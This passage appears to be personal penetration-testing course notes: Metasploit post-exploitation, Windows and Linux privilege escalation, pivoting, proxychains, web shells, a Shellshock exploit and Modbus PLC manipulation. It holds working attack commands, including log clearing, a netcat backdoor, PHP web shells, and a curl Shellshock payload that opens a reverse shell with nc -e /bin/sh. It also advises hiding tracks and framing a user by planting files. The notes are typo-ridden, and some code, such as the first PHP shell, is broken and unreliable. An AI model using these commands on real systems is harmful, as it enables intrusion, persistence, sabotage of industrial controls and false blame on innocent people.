						[run post/windows/gather/credentials/enum_applications] (check install apps)
						[run post/windows/gather/credentials/local_exploit_suggester] (to check can we get more higher level access)
						[run post/windows/gather/usb_history]
						[run event_manager -i]
						[run event_manager -c] (clear the logs)
						We can use mimikatz to erxtract the passwords from our targets as well when 
							[load mimikatz]
						hashdump does not workk
						load mimikatz
						kerberos
					WMIC commands
						List processes
							wmic process list brief
						Start an application
							wmic process call create "calc.exe"
						Get list of process identifiers
							wmic process where (Name='scvhost.exe') get name, processed
						Find a specific process
							wmic process list brief find "cmd.exe"
						Collect environment variables
							wmic environment list
						OS/System Report HTML Formatted
							wmic /output:c: OS.html OS get /format:hform
						Turn on remote desktop remotely
							-wmic /node:"servername" /user:"user@domain" /password: "password" RDToggle where Server Name = "server name" call SetAllowTSConnections 1
						Get startup list
							wmic startup list full
						Collect a list of groups on the local system
							wmic group list brief
						System accounts
							wmic sysaccount list
						Shares list
							wmic shares list
							
					Escalating Privileges
						When we get the shell we might not be at admin or root level privileges.
						We have to escalate out privileges to take more control of the machine
						Techniques we will discuss
							Wmic
							UAC bypass
							Linux privilege escalation
						meterpreter
							getsystem -just
							[run poost/windows/escalate/bypassuac]
							[use incognito](for impersonation)
							[impersonate_token machine_name\\Administrator](Example impersonate administrator)
						WMIC Analysis
							We can use this to identify the patch level of the compromised machine
								windows 7 and later targets
							Look at hte installed KB numbers and from there analyze any vulnerabilities b using the findstr command
							wmic qfe get Caption,Description,HotFixID,InstalledON | findstr "KB3139914". (if noothing comes up than the patch is missing)
						
						findstr
							If ouuutput is returned then the patch is installed => have to look for another one
						
						Priviilege escalation with dirty Cow
								A local privilege escalation against Linux
								Once we have a shell we can attemp to escalate privileges
								Code is buggy but sometimes work
								if you have later than ubuntu 15 Dirty cow might be the way to go
					
						Linux privilege escalation
							Ubuntu 16.04 privilege escalation bpf
								use exploit/linux/local/bpf_priv_esc
							
							[serarchsploit privilege]
							[searchsploit linux kernel 2.6 privilege]
							[use exploit ssh_login and collect the information]
							use info after selecting  the exploit
							
							Ubuntu 12-15
								overlayfs privilege escalation
									[use exploit/linux/local/overlayfs_priv_esc]
							uname -a
								Determine the kernel version
							cat /etc/lsb-release
								Return additional information ablut the machine.
							
						Initial Access
							Brute force an ssh login is motst commo methodology
							Hydra
							Metasploit 
								Auxiliary scanner
									auxiliary/scanner/ssh/ssh_login
									->create session -> overlayfs (attempt to escalate the privileges)
						Search for data in Windows shell
							
							dir /s *pass* == *cred* ==*vnc*==*.config* | more
							findstr /si password *.xml *.ini *.txt
							reg query HKLM /F password /t REG_SZ /s
							reg query HKCU /f password /t REG_SZ/s
						
						Unattended Files
							c:\sysprep.inf
							c:\sysprepsysprep.xml
							%WINDIR%\Panther\Unattend\Unattended.xml
							%WINDIR%\Panther\Unattend.xml
							
						Other files of interst
							Serivices\Services.xml
							ScheduledTasks\ScheduledTasks.xml
							Printers\Printers.xml
							Drives\Drives.xml
							DataSources\DataSources.xml
							
						Shell Limited
							Try and spawn a bash shell
								python -c 'import pty;pty.spawn("/bin/bash")'
								echo OS.system('/bin/bash')
								/bin/sh -i
						
						Sticky Bits
							find / -perm -1000 -type d 2>/dev/null
								only the owner of the directory or the owner of a file can delete or reename.
							find / -perm -g=s -type f 2>/dev/null
								SGID(chmod 2000) - run as the group not the user who started it
							find / -perm -u=s -type f 2>/dev/null
								SUID (chmod 4000) -run as the owner not hte user who started it
								
						Written to and Executed From
							find / -writable -type 2>/dev/null
							find / -perm -222 -type 2>/dev/null
							find / -perm -o w -type 2>/dev/null
								world writeable folders
							find / -perm -o x -type 2>/dev/null
								world executable folders
							find / \(-perm -o w -perm -o x\) -type 2>/dev/null
								world-writeable and executable folders
							
						Dev Tools
							What development tools are on the compromised machine
								[find / -name perl*]
								[find / -name python*]
								[find / -name gcc*]
								[find / -name cc]
						
						File Transfer
							If we have a meterpreter shell then we can transfer files, if not then we need to find what is available.
								[find / -name wget]
								[find / -name nc*]
								[find / -name netcat*]
								[find / -name tftp*]
								[find / -name ftp]
								
						User/Group Account Script
							With a for loop in the windows command shell, we can combine wmic and net user to get extended information about all the users on the system.
								-for /F "skip=1" %i in ('wmic useraccount get name') do net user %i >> users.txt
							Groups
								-for /F "delims=* tokens=1 skip=4" %i in ('net localgroup') do net localgroup %i >>groups.txt
								
							Powershell Script to Transfer a File
								Start the web server on the attacker machine
									service http2 start
								echo $client = New-Object System.Net.WebClient > script.ps1
								$client.DownloadFile($targetlocation,"psexec.exe")
								Execute the script
									powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script.ps1
			
							Example:
								Nmap -sV ip_address (version)
							->	Nessus -> Basic network scan
							->	Nmap -sC ip_address
							->	if there is a web server navigate via browser. -> use dirbuster 
							-> 	Maintain the excel sheet
							->	Scan with vega
							
							Task Add a user and  Task transfer a file using sqli
							
							atftpd
								atftpd --daemon --port port_no --bind-address ip_address /tmp or use any other folders
							
							{always tftp server to own the system}
							
							tftp
								ascii->
								connect
								tftp -i ip_address PUT runsnort.bat
							
							Install backdoor
								netcat on
								upload /usr/share/nc.exe c:\\
								nc -L -p 9007
								
							meterpreter
								[run getgui -u username -p password]
								rdesktop -u username -p password
								
							
							netstast | grep port_number
							hashduump to see the administrator password using meterpreter
							[migrate] 
							[run winenum]
							
							
						Exploit suggester
							In meterpreter shell [run post/multi/recon/local_exploit_suggester]
						
						Writing base64 encoded rat
						
							
							
							
**	COVER YOUR TRACKS
		Remove logs
			Mangle if unable to remove
		Frame a user
			Put files within the user profile
		
**	EVASION
		Rarely asked for today
		Simple unplanned attacks may be succesful but are soon detected and stoppend
		Defenses and detection are almost always present
			Firewall
			IDS/IPS
		Defenses and detection always have flaws
	
** Advanced Tips and techniques
	
	Goals:
	
		Review the concepts of pivoting
			We will encounter networks that are not visible from our attacking machine
			We will need to exploit a machine that is dual homed and connected to anoother network
			This reaching new networks from the original or first victim is known as pivoting
			
			Trust:
				Ince we compromise the first victim we improve our position within the network. The results of compromising the first victim are:
					Having direct routing to the new victims
					Store usernames and passwords
					Allow for footprinting, rnumeration and compromising of new victims
			
			Preparation
				Dual homed machines are common
				Have a plan for when you encounter the machines
				The longer the attack is ongoing the higher the risk of detectiion
				Imperative that the attack is scripted as much as possible
					saves time and avoid typos
				Remember your scope of work
					Off limits areas and rules of engagement
			
			New attack
				Routing will be required
				The victim machine will not have the exploits and payloads that you need to attack the next network and or machine 
				Three methodds for the attack
					Download the utilitiies to the victim and run from the shell
					port forwarding
					session routing
			
					Run from the Shell
						We use upload command in meterpreter
						Alternatively we can ftp or tftp the code over and then install it
						Have to disable protections in most cases
						least desired method
						
					Port Forwarding
						Redirect connection for a port on the first victim to another host
						Useful when
							We have afirewall still between the first compromise and the inside net
							Direct routing to the first victim is available
							Source of the attack is now the address of the first civtim and not us
					
					Session Routing
						Attacker sets up routing to send attacks through the initial victim and on to the next ones
							The attacks are in effect tunneled to the first victim
							Source address of new attacks is the first victim
							Initial victim acts as an exploit proxy
							
						If we to add the route from second machine on the network than
							In meterpreter this is easy
							run autoroute -h
							run autoroute -s ip_address
							run autoroute -p 
							meterpreter
								run post/multi/manage/autoroutee SUBNET=192.168.40.0 ACTION=ADD
								run post/multi/manage/autoroute option=p
							Search the discoverednetwork
								Can use a variety of post modules in metasploit
								
							OS discovery 
								An smb_version discovery scanner
									auxiliary/scanner/smb/smb_version
							
							Exploit through the session
								Same process since we have the route set up
								
							Double Pivot
								The process is the same as covered
								Access a machine via the fist victim and then on the 2nd victim discover the two network cards
								The 2nd network card represents the next network to attack and in a sense this is a double pivoting
								

		Creating and using proxychains
			Proxy chahins
				Sometimes we need to remain untraceable while performing a pentest activity. Proxychains helps us by allowing us to use an intermediary system whose ip can be left in the logs of the system without the worry of it tracing back to us
				
				We can setup a proxu via the tor network or a socks implementation
				
				Steps to setup
					Modify the configuration file for our proxychains
						[/etc/proxychains.config]
					Can run any command through the proxy
						Can setup proxy for tor as well as socks, http etc
					Metasploit proxy modules
						use auxiliary/server/socks4a
					
				Usage
					Once you have set the proxy all commands can be used through it using proxychains through the port that you have setup
						proxychains Nmap -sT ip_address
				
		Explore web shells
			Web Shells
				Malicious script used by an attacker with the intent to escalate and maintain persistent access on an already compromised web application
				
				Persistent Remote Access
					A web-shell usually contains a backdoor which allows an attacker to remotely access and possibly control a server at any time
				
				A  web-shell can be used for pivoting inside or outside a network.
					
					b374k is of one kind and check the create shell in privious chapter.
					
					Weevely (brute force sql and many more)
					
					Creating a custom shell
						Requires command execution
						form handling
						conditionals
						focus
						
						Example
						<?php
							if($_POST['command'])
							{
								if($_POST['out']."\n";{
									if(stren($out)>2000)
									{
										$out=substr($out,strlen($out,strlen($out) - 2000,2000);
									}
								}
								$out.=">($_POST['command'])\n";
								exec($_POST['command'],$data);$out.=implode("\n",$data);
							}
						?>
						
						First Create a form with post and submit
					
						Basic php shell
						
						<html>
						<head>
						<title>Simple PHP Shell</title>
						</head>
						<body>
						<form action="shell.php" method = post>
						<input type ="text" name="c"/>
						<input name="submit" type=submit value="command">
						</form>
						<?php
							if(isset($_REQUEST['submit'])){
								$c=$_REQUEST['$c']
								$output = shell_exec("$c");
								echo "<pre>$output</pre>\n";
							}
						?>
						</body>
						</html>

		Scanning with Nmap with Nmap against defenses
			Nmap -sS ip_address
			Nmap -sS ip_address
			Nmap -sC ip_address
			
			when their is filter applied
				than go to wireshark
				and use filter [TCP.flags.syn ==1 and TCP.flags.ack == 1]
				
			
			iptables -A INPUT -J REJECT --reject-with-icmp-host-prohibited
			
			CISCO router
				apt get install dynagin
				get the cisco ios
		
		Source port scanning
			Nmap -sS ip_address -Pn 
			Active ftp
				20
			nc -p 20 ip_address port_number
			wrieshark -> TCP.poort == 20 ->capture 
			Nmap -g 20 -sS ip_address/range (g=source port)
			Nmap -g 20 -sV ip_address (services scan)
			Nmap -sS ip_address -Pn
			Nmap -g 20 -A ip_addresss
			check metasploit if it has the exploit sometime it don't find the option
			show advanced option
			set CPORT 20
			set LPORT 123
			if you get session try change payload
			rexploit
			try restart the OS
			
			c:\>netstat -rm
		
		Low Balancing
			netcraft.com
			hping3 -S domain_name -p port_number
			arp -a
			lbd domain_name
			wafw00f domain_name
			obfuscation
				hackbar
				
		Set tool
			9 - powershell attack vector
			l for numeric shellcode
			ip_address
			set port
			turn off firewall using sript
			run in powershell\
			and session -i 1 in meterpreteer
					
		Pivoting
			run autorout -s ip_address
			run autoroute -packe
			run /exploit/auxilary/arp_scanner (serarch for subnet)
			search smb version (searching for next machine)
			set RHOST ip_address
			set threads 50
			run
			and wait
			search tikiwiki
			use exploit/unix/webapp/tikiwiki_graph_fortmul
			set Rhost and port
			search ms17-010
			search ms08_067
			
		Proxychains
			vi /etc/proxychains.conf 
			search socks
			use auxilary/socks4a
			proxychains Nmap -sT ip_address (stealth search)
		
		webshells
			same as previous
		
		Exploiting shellshock using curl
			Nmap -sS ip_address
			Nmap -sV ip_address
			nikto -h ip_address -c all -o nikto.results.html | grep cookies(c=cgi.bin directories)
			web browser -> ipaddress/cgi-bin/printenv (shellshock) runnigscript using html
			
			
			nc -l -v -p 123
			curl -H ""User-Agent: {} {:;}; /bin/nc -e /bin/sh "ip_address" httpp://ip_address/chi-bin/printenv
			so we can run python script
			python -c "import pty; pty.spawn('/bin/bash')"
			./etc/profile
			cd /tmp
			nc ip_address > cowroot32 (download dirty_cow)			
			nc - l -v -nn -p 123
			cd /tmp 
			chmod +x cowroot32
			and put the python shell against
			run the  ./cowroot32 in python envoirnment in victim machine
			
		SCADA system
			Nmap -sP ip_address/range
			Nmap -sS ip_address (to check the port)
			Nmap -sV -p 10000 ip_address (check the port what is running on that port; just see the attack surface)
			Nmap -sC ip_address
			check enumeration using check
			most iot have default password
			
		ICS/SCADA Modbus Protocol
			Nmap -sP ip_address (ping sweep)
			Nmap -sS ip_address,second_ip
			
			
			metasploit >> Search modbus
			see the modules
			set auuxilary/scanner/scada/modbusclient
			see options and see the port
			set UNIT_ID_TO 12
			set RHOSTS ip_address
			run
			 manipulating the plc means we are manipulating the control
			set UNIT_NUMBER 8
			set RHOSTS ip_address
			we can change the values
			set DATA_ADDRESS 0
			we can turn on off and many things
			set ACTION READ_COILS
			
Practice Ranges

	Practice scanning
	Scanning, enumeration and finding vulnerabilities
	
			 
		
			
			
			
			
			
			
			
			

























































































